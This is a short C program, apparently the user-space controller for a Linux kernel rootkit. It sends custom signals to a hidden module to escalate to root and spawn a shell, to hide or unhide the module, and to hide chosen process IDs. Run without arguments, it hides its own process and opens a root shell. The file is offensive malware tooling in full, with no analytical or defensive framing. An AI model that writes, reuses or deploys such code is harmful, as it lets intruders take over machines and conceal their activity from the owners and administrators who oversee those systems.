#include <signal.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]){
    //Runnning A specific feature
    if(argc > 1){
        //Get root and launch a shell
        if(strcmp(argv[1], "root") == 0) {
            kill(99,32);
            system ("/bin/sh");
        }
        //Hide the module
        else if(strcmp(argv[1], "hide") == 0) {
            kill(99,33);
        }
        //Unhide module
        else if(strcmp(argv[1], "unhide") == 0) {
            kill(99,34);
        }
        //Hide a pid sepcified on the command line
        else if(strcmp(argv[1], "hidepid") == 0) {
            kill(atoi(argv[2]),35);
        }
    }
    else {
        //Running just as a standalone program
        pid_t pid = getpid();
        kill(pid,35);
        kill(99,32);
        system ("/bin/sh");
    }

    
    return 0;
}